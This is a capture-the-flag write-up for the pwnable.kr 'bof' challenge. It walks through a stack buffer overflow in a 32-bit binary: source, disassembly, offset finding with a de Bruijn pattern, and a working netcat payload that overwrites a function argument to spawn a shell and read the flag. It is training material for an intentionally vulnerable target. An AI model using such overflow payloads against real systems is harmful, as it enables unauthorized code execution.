# Solution

challenge:
```
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```

bof:
```
bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
```

bof.c:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);       // smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

>since this is 32bit the parameters to functions will be loaded on the stack instead of the registers like in 64bit

func:
```asm
┌ 94: sym.func (uint32_t arg_8h);
│           ; var int32_t var_2ch @ ebp-0x2c
│           ; var int32_t var_ch @ ebp-0xc
│           ; arg uint32_t arg_8h @ ebp+0x8
│           0x0000062c      55             push ebp
│           0x0000062d      89e5           mov ebp, esp
│           0x0000062f      83ec48         sub esp, 0x48
│           0x00000632      65a114000000   mov eax, dword gs:[0x14]
│           0x00000638      8945f4         mov dword [var_ch], eax
│           0x0000063b      31c0           xor eax, eax
│           0x0000063d      c704248c0700.  mov dword [esp], str.overflow_me_:_ ; [0x78c:4]=0x7265766f ; "overflow me : "; RELOC 32  ; int32_t arg_8h                                                                                    
│           0x00000644      e8fcffffff     call puts                   ; RELOC 32 puts
│           0x00000649      8d45d4         lea eax, [var_2ch]
│           0x0000064c      890424         mov dword [esp], eax        ; int32_t arg_8h
│           0x0000064f      e8fcffffff     call gets                   ; RELOC 32 gets
│           0x00000654      817d08bebafe.  cmp dword [arg_8h], 0xcafebabe
│       ┌─< 0x0000065b      750e           jne 0x66b
│       │   0x0000065d      c704249b0700.  mov dword [esp], str._bin_sh ; [0x79b:4]=0x6e69622f ; "/bin/sh"; RELOC 32  ; int32_t arg_8h
│       │   0x00000664      e8fcffffff     call system                 ; RELOC 32 system
```

generate a de bruijn sequence for figuring out the stack offset
> ragg2 -P 100 -r
> AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh

gdb:
set a break point at the cmp of 0xcafebabe and the key. read the values from register ebp and find the offset.
```
(gdb) x/wx $ebp+0x8
0xffffcfb0:     0x41534141
(gdb) 
```
0x410x53 is 'AS'
which leaves us with the resulting offset:
len(AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARA) = 52
ebp starts at 'AS'
so the payload should look like
```bash
echo "AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARA\xbe\xba\xfe\xca" -n | nc pwnable.kr 9000
```

get the flag:
```
(echo "AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAAR\xbe\xba\xfe\xca"; cat) | nc pwnable.kr 9000
cat flag.txt
cat: flag.txt: No such file or directory
ls -la
total 7204
drwxr-x---   3 root bof     4096 Dec 25  2022 .
drwxr-xr-x 116 root root    4096 Oct 30 05:25 ..
d---------   2 root root    4096 Jun 12  2014 .bash_history
-r-xr-x---   1 root bof     7348 Sep 12  2016 bof
-rw-r--r--   1 root root     308 Oct 23  2016 bof.c
-r--r-----   1 root bof       32 Jun 11  2014 flag
-rw-r--r--   1 root root 7337229 Apr 20 02:00 log
-rwx------   1 root root     760 Sep 11  2014 super.pl
cat flag
daddy, I just pwned a buFFer :)
```

after having some trouble getting the payload to work I found the workaround with cat. this has to do with stdin and stdout colliding in the communication process of transferring the payload.